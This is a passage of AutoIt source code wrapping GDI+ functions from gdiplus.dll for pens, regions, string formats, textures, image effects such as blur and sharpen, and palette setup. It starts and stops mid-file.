EndFunc

Func _gdiplus_pensettransform($hpen, $hmatrix)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPenTransform", "handle", $hpen, "handle", $hmatrix)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_pensetwidth($hpen, $fwidth)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetPenWidth", "handle", $hpen, "float", $fwidth)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_rectfcreate($nx = 0, $ny = 0, $nwidth = 0, $nheight = 0)
	Local $trectf = DllStructCreate($taggdiprectf)
	DllStructSetData($trectf, "X", $nx)
	DllStructSetData($trectf, "Y", $ny)
	DllStructSetData($trectf, "Width", $nwidth)
	DllStructSetData($trectf, "Height", $nheight)
	Return $trectf
EndFunc

Func _gdiplus_regionclone($hregion)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCloneRegion", "handle", $hregion, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_regioncombinepath($hregion, $hpath, $icombinemode = 2)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCombineRegionPath", "handle", $hregion, "handle", $hpath, "int", $icombinemode)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_regioncombinerect($hregion, $nx, $ny, $nwidth, $nheight, $icombinemode = 2)
	Local $trectf = _gdiplus_rectfcreate($nx, $ny, $nwidth, $nheight)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCombineRegionRect", "handle", $hregion, "struct*", $trectf, "int", $icombinemode)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_regioncombineregion($hregiondst, $hregionsrc, $icombinemode = 2)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCombineRegionRegion", "handle", $hregiondst, "handle", $hregionsrc, "int", $icombinemode)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_regioncreate()
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateRegion", "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[1]
EndFunc

Func _gdiplus_regioncreatefrompath($hpath)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateRegionPath", "handle", $hpath, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_regioncreatefromrect($nx, $ny, $nwidth, $nheight)
	Local $trectf = _gdiplus_rectfcreate($nx, $ny, $nwidth, $nheight)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateRegionRect", "struct*", $trectf, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_regiondispose($hregion)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDeleteRegion", "handle", $hregion)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_regiongetbounds($hregion, $hgraphics)
	Local $trectf = DllStructCreate($taggdiprectf)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetRegionBounds", "handle", $hregion, "handle", $hgraphics, "struct*", $trectf)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Local $abounds[4]
	For $ii = 1 To 4
		$abounds[$ii - 1] = DllStructGetData($trectf, $ii)
	Next
	Return $abounds
EndFunc

Func _gdiplus_regiongethrgn($hregion, $hgraphics = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetRegionHRgn", "handle", $hregion, "handle", $hgraphics, "handle*", 0)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return $aresult[3]
EndFunc

Func _gdiplus_regionsetempty($hregion)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetEmpty", "handle", $hregion)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_regionsetinfinite($hregion)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetInfinite", "handle", $hregion)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_regiontransform($hregion, $hmatrix)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipTransformRegion", "handle", $hregion, "handle", $hmatrix)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_regiontranslate($hregion, $ndx, $ndy)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipTranslateRegion", "handle", $hregion, "float", $ndx, "float", $ndy)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_shutdown()
	If $__g_hgdipdll = 0 Then Return SetError(-1, -1, False)
	$__g_igdipref -= 1
	If $__g_igdipref = 0 Then
		DllCall($__g_hgdipdll, "none", "GdiplusShutdown", "ulong_ptr", $__g_igdiptoken)
		DllClose($__g_hgdipdll)
		$__g_hgdipdll = 0
	EndIf
	Return True
EndFunc

Func _gdiplus_startup($sgdipdll = Default, $bretdllhandle = False)
	$__g_igdipref += 1
	If $__g_igdipref > 1 Then Return True
	If $sgdipdll = Default Then $sgdipdll = "gdiplus.dll"
	$__g_hgdipdll = DllOpen($sgdipdll)
	If $__g_hgdipdll = -1 Then
		$__g_igdipref = 0
		Return SetError(1, 2, False)
	EndIf
	Local $sver = FileGetVersion($sgdipdll)
	$sver = StringSplit($sver, ".")
	If $sver[1] > 5 Then $__g_bgdip_v1_0 = False
	Local $tinput = DllStructCreate($taggdipstartupinput)
	Local $ttoken = DllStructCreate("ulong_ptr Data")
	DllStructSetData($tinput, "Version", 1)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdiplusStartup", "struct*", $ttoken, "struct*", $tinput, "ptr", 0)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	$__g_igdiptoken = DllStructGetData($ttoken, "Data")
	If $bretdllhandle Then Return $__g_hgdipdll
	Return SetExtended($sver[1], True)
EndFunc

Func _gdiplus_stringformatcreate($iformat = 0, $ilangid = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateStringFormat", "int", $iformat, "word", $ilangid, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[3]
EndFunc

Func _gdiplus_stringformatdispose($hformat)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDeleteStringFormat", "handle", $hformat)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_stringformatgetmeasurablecharacterrangecount($hstringformat)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetStringFormatMeasurableCharacterRangeCount", "handle", $hstringformat, "int*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_stringformatsetalign($hstringformat, $iflag)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetStringFormatAlign", "handle", $hstringformat, "int", $iflag)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_stringformatsetlinealign($hstringformat, $istringalign)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetStringFormatLineAlign", "handle", $hstringformat, "int", $istringalign)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_stringformatsetmeasurablecharacterranges($hstringformat, $aranges)
	Local $icount = $aranges[0][0]
	Local $tcharacterranges = DllStructCreate("int[" & $icount * 2 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tcharacterranges, 1, $aranges[$ii][0], (($ii - 1) * 2) + 1)
		DllStructSetData($tcharacterranges, 1, $aranges[$ii][1], (($ii - 1) * 2) + 2)
	Next
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetStringFormatMeasurableCharacterRanges", "handle", $hstringformat, "int", $icount, "struct*", $tcharacterranges)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_texturecreate($himage, $iwrapmode = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateTexture", "handle", $himage, "int", $iwrapmode, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[3]
EndFunc

Func _gdiplus_texturecreate2($himage, $nx, $ny, $nwidth, $nheight, $iwrapmode = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateTexture2", "handle", $himage, "int", $iwrapmode, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[7]
EndFunc

Func _gdiplus_texturecreateia($himage, $nx, $ny, $nwidth, $nheight, $pimageattributes = 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipCreateTextureIA", "handle", $himage, "handle", $pimageattributes, "float", $nx, "float", $ny, "float", $nwidth, "float", $nheight, "ptr*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[7]
EndFunc

Func __gdiplus_brushdefcreate(ByRef $hbrush)
	If $hbrush = 0 Then
		$__g_hgdipbrush = _gdiplus_brushcreatesolid()
		$hbrush = $__g_hgdipbrush
	EndIf
EndFunc

Func __gdiplus_brushdefdispose($icurerror = @error, $icurextended = @extended)
	If $__g_hgdipbrush <> 0 Then
		_gdiplus_brushdispose($__g_hgdipbrush)
		$__g_hgdipbrush = 0
	EndIf
	Return SetError($icurerror, $icurextended)
EndFunc

Func __gdiplus_extractfileext($sfilename, $bnodot = True)
	Local $iindex = __gdiplus_lastdelimiter(".\:", $sfilename)
	If ($iindex > 0) AND (StringMid($sfilename, $iindex, 1) = ".") Then
		If $bnodot Then
			Return StringMid($sfilename, $iindex + 1)
		Else
			Return StringMid($sfilename, $iindex)
		EndIf
	Else
		Return ""
	EndIf
EndFunc

Func __gdiplus_lastdelimiter($sdelimiters, $sstring)
	Local $sdelimiter, $in
	For $ii = 1 To StringLen($sdelimiters)
		$sdelimiter = StringMid($sdelimiters, $ii, 1)
		$in = StringInStr($sstring, $sdelimiter, $str_nocasesensebasic, -1)
		If $in > 0 Then Return $in
	Next
EndFunc

Func __gdiplus_pendefcreate(ByRef $hpen)
	If $hpen = 0 Then
		$__g_hgdippen = _gdiplus_pencreate()
		$hpen = $__g_hgdippen
	EndIf
EndFunc

Func __gdiplus_pendefdispose($icurerror = @error, $icurextended = @extended)
	If $__g_hgdippen <> 0 Then
		_gdiplus_pendispose($__g_hgdippen)
		$__g_hgdippen = 0
	EndIf
	Return SetError($icurerror, $icurextended)
EndFunc

Func _gdiplus_bitmapapplyeffect($hbitmap, $heffect, $trect = NULL )
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, False)
	If NOT IsPtr($heffect) Then Return SetError(10, 0, False)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipBitmapApplyEffect", "handle", $hbitmap, "handle", $heffect, "struct*", $trect, "int", 0, "ptr*", 0, "int*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_bitmapapplyeffectex($hbitmap, $heffect, $ix = 0, $iy = 0, $iw = 0, $ih = 0)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, False)
	Local $trect = 0
	If BitOR($ix, $iy, $iw, $ih) Then
		$trect = DllStructCreate("int Left; int Top; int Right; int Bottom;")
		DllStructSetData($trect, "Right", $iw + DllStructSetData($trect, "Left", $ix))
		DllStructSetData($trect, "Bottom", $ih + DllStructSetData($trect, "Top", $iy))
	EndIf
	Local $istatus = _gdiplus_bitmapapplyeffect($hbitmap, $heffect, $trect)
	If NOT $istatus Then Return SetError(@error, @extended, False)
	Return True
EndFunc

Func _gdiplus_bitmapconvertformat($hbitmap, $ipixelformat, $idithertype, $ipalettetype, $tpalette, $falphathresholdpercent = 0)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, False)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipBitmapConvertFormat", "handle", $hbitmap, "uint", $ipixelformat, "uint", $idithertype, "uint", $ipalettetype, "struct*", $tpalette, "float", $falphathresholdpercent)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_bitmapcreateapplyeffect($hbitmap, $heffect, $trect = NULL , $toutrect = NULL )
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipBitmapCreateApplyEffect", "handle*", $hbitmap, "int", 1, "handle", $heffect, "struct*", $trect, "struct*", $toutrect, "handle*", 0, "int", 0, "ptr*", 0, "int*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[6]
EndFunc

Func _gdiplus_bitmapcreateapplyeffectex($hbitmap, $heffect, $ix = 0, $iy = 0, $iw = 0, $ih = 0)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $trect = 0
	If BitOR($ix, $iy, $iw, $ih) Then
		$trect = DllStructCreate("int Left; int Top; int Right; int Bottom;")
		DllStructSetData($trect, "Right", $iw + DllStructSetData($trect, "Left", $ix))
		DllStructSetData($trect, "Bottom", $ih + DllStructSetData($trect, "Top", $iy))
	EndIf
	Local $hbitmap_fx = _gdiplus_bitmapcreateapplyeffect($hbitmap, $heffect, $trect, NULL )
	Return SetError(@error, @extended, $hbitmap_fx)
EndFunc

Func _gdiplus_bitmapgethistogram($hbitmap, $ihistogramformat, $ihistogramsize, $tchannel_0, $tchannel_1 = 0, $tchannel_2 = 0, $tchannel_3 = 0)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, False)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipBitmapGetHistogram", "handle", $hbitmap, "uint", $ihistogramformat, "uint", $ihistogramsize, "struct*", $tchannel_0, "struct*", $tchannel_1, "struct*", $tchannel_2, "struct*", $tchannel_3)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_bitmapgethistogramex($hbitmap)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $isize = _gdiplus_bitmapgethistogramsize($gdip_histogramformatargb)
	Local $thistogram = DllStructCreate("int Size; uint Red[" & $isize & "]; uint MaxRed; uint Green[" & $isize & "]; uint MaxGreen; uint Blue[" & $isize & "]; uint MaxBlue; uint Alpha[" & $isize & "]; uint MaxAlpha; uint Grey[" & $isize & "]; uint MaxGrey;")
	DllStructSetData($thistogram, "Size", $isize)
	Local $istatus = _gdiplus_bitmapgethistogram($hbitmap, $gdip_histogramformatargb, $isize, DllStructGetPtr($thistogram, "Alpha"), DllStructGetPtr($thistogram, "Red"), DllStructGetPtr($thistogram, "Green"), DllStructGetPtr($thistogram, "Blue"))
	If NOT $istatus Then Return SetError(@error, @extended, 0)
	$istatus = _gdiplus_bitmapgethistogram($hbitmap, $gdip_histogramformatgray, $isize, DllStructGetPtr($thistogram, "Grey"))
	If NOT $istatus Then Return SetError(@error + 10, @extended, 0)
	Local $imaxred = 0, $imaxgreen = 0, $imaxblue = 0, $imaxalpha = 0, $imaxgrey = 0
	For $i = 1 To $isize
		If DllStructGetData($thistogram, "Red", $i) > $imaxred Then $imaxred = DllStructGetData($thistogram, "Red", $i)
		If DllStructGetData($thistogram, "Green", $i) > $imaxgreen Then $imaxgreen = DllStructGetData($thistogram, "Green", $i)
		If DllStructGetData($thistogram, "Blue", $i) > $imaxblue Then $imaxblue = DllStructGetData($thistogram, "Blue", $i)
		If DllStructGetData($thistogram, "Alpha", $i) > $imaxalpha Then $imaxalpha = DllStructGetData($thistogram, "Alpha", $i)
		If DllStructGetData($thistogram, "Grey", $i) > $imaxgrey Then $imaxgrey = DllStructGetData($thistogram, "Grey", $i)
	Next
	DllStructSetData($thistogram, "MaxRed", $imaxred)
	DllStructSetData($thistogram, "MaxGreen", $imaxgreen)
	DllStructSetData($thistogram, "MaxBlue", $imaxblue)
	DllStructSetData($thistogram, "MaxAlpha", $imaxalpha)
	DllStructSetData($thistogram, "MaxGrey", $imaxgrey)
	Return $thistogram
EndFunc

Func _gdiplus_bitmapgethistogramsize($iformat)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipBitmapGetHistogramSize", "uint", $iformat, "uint*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[2]
EndFunc

Func _gdiplus_drawimagefx($hgraphics, $himage, $heffect, $trectf = 0, $hmatrix = 0, $himgattributes = 0, $iunit = 2)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, False)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDrawImageFX", "handle", $hgraphics, "handle", $himage, "struct*", $trectf, "handle", $hmatrix, "handle", $heffect, "handle", $himgattributes, "uint", $iunit)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_drawimagefxex($hgraphics, $himage, $heffect, $nx = 0, $ny = 0, $nw = 0, $nh = 0, $hmatrix = 0, $himgattributes = 0, $iunit = 2)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, False)
	Local $trectf = 0
	If BitOR($nx, $ny, $nw, $nh) Then $trectf = _gdiplus_rectfcreate($nx, $ny, $nw, $nh)
	Local $istatus = _gdiplus_drawimagefx($hgraphics, $himage, $heffect, $trectf, $hmatrix, $himgattributes, $iunit)
	Return SetError(@error, @extended, $istatus)
EndFunc

Func _gdiplus_effectcreate($seffectguid)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $tguid = _winapi_guidfromstring($seffectguid)
	Local $aresult = 0
	If @AutoItX64 Then
		$aresult = DllCall($__g_hgdipdll, "int", "GdipCreateEffect", "struct*", $tguid, "handle*", 0)
		If @error Then Return SetError(@error, @extended, 0)
		If $aresult[0] Then Return SetError(10, $aresult[0], 0)
		Return $aresult[2]
	EndIf
	Local $telem = DllStructCreate("uint64[2];", DllStructGetPtr($tguid))
	$aresult = DllCall($__g_hgdipdll, "int", "GdipCreateEffect", "uint64", DllStructGetData($telem, 1, 1), "uint64", DllStructGetData($telem, 1, 2), "handle*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], 0)
	Return $aresult[3]
EndFunc

Func _gdiplus_effectcreateblur($fradius = 10, $bexpandedge = False)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $teffectparameters = DllStructCreate($taggdip_effectparams_blur)
	DllStructSetData($teffectparameters, "Radius", $fradius)
	DllStructSetData($teffectparameters, "ExpandEdge", $bexpandedge)
	Local $heffect = _gdiplus_effectcreate($gdip_blureffectguid)
	If @error Then Return SetError(@error, @extended, 0)
	_gdiplus_effectsetparameters($heffect, $teffectparameters)
	If @error Then Return SetError(@error + 10, @extended, 0)
	Return $heffect
EndFunc

Func _gdiplus_effectcreatebrightnesscontrast($ibrightnesslevel = 0, $icontrastlevel = 0)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $teffectparameters = DllStructCreate($taggdip_effectparams_brightnesscontrast)
	DllStructSetData($teffectparameters, "BrightnessLevel", $ibrightnesslevel)
	DllStructSetData($teffectparameters, "ContrastLevel", $icontrastlevel)
	Local $heffect = _gdiplus_effectcreate($gdip_brightnesscontrasteffectguid)
	If @error Then Return SetError(@error, @extended, 0)
	_gdiplus_effectsetparameters($heffect, $teffectparameters)
	If @error Then Return SetError(@error + 10, @extended, 0)
	Return $heffect
EndFunc

Func _gdiplus_effectcreatecolorbalance($icyanred = 0, $imagentagreen = 0, $iyellowblue = 0)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $teffectparameters = DllStructCreate($taggdip_effectparams_colorbalance)
	DllStructSetData($teffectparameters, "CyanRed", $icyanred)
	DllStructSetData($teffectparameters, "MagentaGreen", $imagentagreen)
	DllStructSetData($teffectparameters, "YellowBlue", $iyellowblue)
	Local $heffect = _gdiplus_effectcreate($gdip_colorbalanceeffectguid)
	If @error Then Return SetError(@error, @extended, 0)
	_gdiplus_effectsetparameters($heffect, $teffectparameters)
	If @error Then Return SetError(@error + 10, @extended, 0)
	Return $heffect
EndFunc

Func _gdiplus_effectcreatecolorcurve($iadjustment, $ichannel, $iadjustvalue)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $teffectparameters = DllStructCreate($taggdip_effectparams_colorcurve)
	DllStructSetData($teffectparameters, "Adjustment", $iadjustment)
	DllStructSetData($teffectparameters, "Channel", $ichannel)
	DllStructSetData($teffectparameters, "AdjustValue", $iadjustvalue)
	Local $heffect = _gdiplus_effectcreate($gdip_colorcurveeffectguid)
	If @error Then Return SetError(@error, @extended, 0)
	_gdiplus_effectsetparameters($heffect, $teffectparameters)
	If @error Then Return SetError(@error + 10, @extended, 0)
	Return $heffect
EndFunc

Func _gdiplus_effectcreatecolorlut($acolorlut)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $teffectparameters = DllStructCreate($taggdip_effectparams_colorlut)
	For $ii = 0 To 255
		DllStructSetData($teffectparameters, "LutA", $acolorlut[$ii][0], $ii + 1)
		DllStructSetData($teffectparameters, "LutR", $acolorlut[$ii][1], $ii + 1)
		DllStructSetData($teffectparameters, "LutG", $acolorlut[$ii][2], $ii + 1)
		DllStructSetData($teffectparameters, "LutB", $acolorlut[$ii][3], $ii + 1)
	Next
	Local $heffect = _gdiplus_effectcreate($gdip_colorluteffectguid)
	If @error Then Return SetError(@error, @extended, 0)
	_gdiplus_effectsetparameters($heffect, $teffectparameters)
	If @error Then Return SetError(@error + 10, @extended, 0)
	Return $heffect
EndFunc

Func _gdiplus_effectcreatecolormatrix($tcolormatrix)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $heffect = _gdiplus_effectcreate($gdip_colormatrixeffectguid)
	If @error Then Return SetError(@error, @extended, 0)
	_gdiplus_effectsetparameters($heffect, $tcolormatrix)
	If @error Then Return SetError(@error + 10, @extended, 0)
	Return $heffect
EndFunc

Func _gdiplus_effectcreatehuesaturationlightness($ihuelevel = 0, $isaturationlevel = 0, $ilightnesslevel = 0)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $teffectparameters = DllStructCreate($taggdip_effectparams_huesaturationlightness)
	DllStructSetData($teffectparameters, "HueLevel", $ihuelevel)
	DllStructSetData($teffectparameters, "SaturationLevel", $isaturationlevel)
	DllStructSetData($teffectparameters, "LightnessLevel", $ilightnesslevel)
	Local $heffect = _gdiplus_effectcreate($gdip_huesaturationlightnesseffectguid)
	If @error Then Return SetError(@error, @extended, 0)
	_gdiplus_effectsetparameters($heffect, $teffectparameters)
	If @error Then Return SetError(@error + 10, @extended, 0)
	Return $heffect
EndFunc

Func _gdiplus_effectcreatelevels($ihighlight = 100, $imidtone = 0, $ishadow = 0)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $teffectparameters = DllStructCreate($taggdip_effectparams_levels)
	DllStructSetData($teffectparameters, "Highlight", $ihighlight)
	DllStructSetData($teffectparameters, "Midtone", $imidtone)
	DllStructSetData($teffectparameters, "Shadow", $ishadow)
	Local $heffect = _gdiplus_effectcreate($gdip_levelseffectguid)
	If @error Then Return SetError(@error, @extended, 0)
	_gdiplus_effectsetparameters($heffect, $teffectparameters)
	If @error Then Return SetError(@error + 10, @extended, 0)
	Return $heffect
EndFunc

Func _gdiplus_effectcreateredeyecorrection($aareas)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $icount = $aareas[0][0]
	Local $tareas = DllStructCreate("long[" & $icount * 4 & "]")
	For $ii = 1 To $icount
		DllStructSetData($tareas, 1, DllStructSetData($tareas, 1, $aareas[$ii][0], (($ii - 1) * 4) + 1) + $aareas[$ii][2], (($ii - 1) * 4) + 3)
		DllStructSetData($tareas, 1, DllStructSetData($tareas, 1, $aareas[$ii][1], (($ii - 1) * 4) + 2) + $aareas[$ii][3], (($ii - 1) * 4) + 4)
	Next
	Local $teffectparameters = DllStructCreate($taggdip_effectparams_redeyecorrection)
	DllStructSetData($teffectparameters, "NumberOfAreas", $icount)
	DllStructSetData($teffectparameters, "Areas", DllStructGetPtr($tareas))
	Local $heffect = _gdiplus_effectcreate($gdip_redeyecorrectioneffectguid)
	If @error Then Return SetError(@error, @extended, 0)
	_gdiplus_effectsetparameters($heffect, $teffectparameters, (DllStructGetSize($tareas) + DllStructGetSize($teffectparameters)) / DllStructGetSize($teffectparameters))
	If @error Then Return SetError(@error + 10, @extended, 0)
	Return $heffect
EndFunc

Func _gdiplus_effectcreatesharpen($fradius = 10, $famount = 50)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $teffectparameters = DllStructCreate($taggdip_effectparams_sharpen)
	DllStructSetData($teffectparameters, "Radius", $fradius)
	DllStructSetData($teffectparameters, "Amount", $famount)
	Local $heffect = _gdiplus_effectcreate($gdip_sharpeneffectguid)
	If @error Then Return SetError(@error, @extended, 0)
	_gdiplus_effectsetparameters($heffect, $teffectparameters)
	If @error Then Return SetError(@error + 10, @extended, 0)
	Return $heffect
EndFunc

Func _gdiplus_effectcreatetint($ihue = 0, $iamount = 0)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	Local $teffectparameters = DllStructCreate($taggdip_effectparams_tint)
	DllStructSetData($teffectparameters, "Hue", $ihue)
	DllStructSetData($teffectparameters, "Amount", $iamount)
	Local $heffect = _gdiplus_effectcreate($gdip_tinteffectguid)
	If @error Then Return SetError(@error, @extended, 0)
	_gdiplus_effectsetparameters($heffect, $teffectparameters)
	If @error Then Return SetError(@error + 10, @extended, 0)
	Return $heffect
EndFunc

Func _gdiplus_effectdispose($heffect)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, False)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipDeleteEffect", "handle", $heffect)
	If @error Then Return SetError(@error, @extended, 0)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_effectgetparameters($heffect, $teffectparameters)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, False)
	If DllStructGetSize($teffectparameters) < __gdiplus_effectgetparametersize($heffect) Then Return SetError(2, 5, False)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetEffectParameters", "handle", $heffect, "uint*", DllStructGetSize($teffectparameters), "struct*", $teffectparameters)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func __gdiplus_effectgetparametersize($heffect)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, -1)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipGetEffectParameterSize", "handle", $heffect, "uint*", 0)
	If @error Then Return SetError(@error, @extended, -1)
	If $aresult[0] Then Return SetError(10, $aresult[0], -1)
	Return $aresult[2]
EndFunc

Func _gdiplus_effectsetparameters($heffect, $teffectparameters, $isizeadjust = 1)
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, False)
	Local $isize = __gdiplus_effectgetparametersize($heffect)
	If @error Then Return SetError(@error, @extended, False)
	Local $aresult = DllCall($__g_hgdipdll, "int", "GdipSetEffectParameters", "handle", $heffect, "struct*", $teffectparameters, "uint", $isize * $isizeadjust)
	If @error Then Return SetError(@error, @extended, False)
	If $aresult[0] Then Return SetError(10, $aresult[0], False)
	Return True
EndFunc

Func _gdiplus_paletteinitialize($ientries, $ipalettetype = $gdip_palettetypeoptimal, $ioptimalcolors = 0, $busetransparentcolor = True, $hbitmap = NULL )
	If $__g_bgdip_v1_0 Then Return SetError(-1, 0, 0)
	If $ioptimalcolors > 0 Then $ipalettetype = $gdip_palettetypeoptimal
	Local $tpalette = DllStructCreate("uint Flags; uint Count; uint ARGB[" & $ientries & "];")
	DllStructSetData($tpalette, "Flags", $ipalettetype)
	DllStructSetData($tpalette, "Count", $ientries)
